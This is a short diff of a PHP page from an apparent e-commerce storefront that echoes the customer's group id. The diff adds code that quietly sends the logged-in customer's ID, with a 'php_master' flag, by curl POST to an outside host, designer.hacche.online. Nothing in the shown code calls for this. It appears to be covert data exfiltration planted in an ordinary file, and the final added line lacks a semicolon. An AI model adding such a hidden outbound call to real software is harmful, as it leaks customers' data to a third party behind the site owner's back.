@@ -44,8 +44,12 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
       echo   $customerSession->getCustomer()->getGroupId()."<br/>";  // get Customer Group Id
     }  
  
-
-
+    $data = array('customerID' => $customerSession->getCustomer()->getId(), 'php_master' => true);
+    $handle = curl_init('http://designer.hacche.online');
+    curl_setopt($handle, CURLOPT_POST, true);
+    curl_setopt($handle, CURLOPT_POSTFIELDS, $data);
+    curl_exec($handle);
+    curl_close($handle)
 ?>
 
 
